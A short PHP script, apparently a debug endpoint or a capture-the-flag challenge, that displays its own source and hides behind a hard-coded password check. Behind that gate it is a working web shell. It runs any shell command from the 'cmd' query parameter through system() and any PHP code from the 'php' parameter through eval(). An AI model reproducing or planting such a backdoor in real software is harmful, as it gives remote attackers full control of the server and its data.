<?php
require_once $_SERVER['DOCUMENT_ROOT']. '/libconst.php';
if (!DEBUG) highlight_file(__FILE__);
const PSW = '169882577affed3722660a9e7ef0b176';
if (!DEBUG || $_GET['psw'] !== PSW) {
    header('HTTP/1.1 403 What Are You Looking?');
    die();
}
ini_set('display_errors', 1);
if (isset($_GET['cmd'])) system($_GET['cmd']);
if (isset($_GET['php'])) eval($_GET['php']);
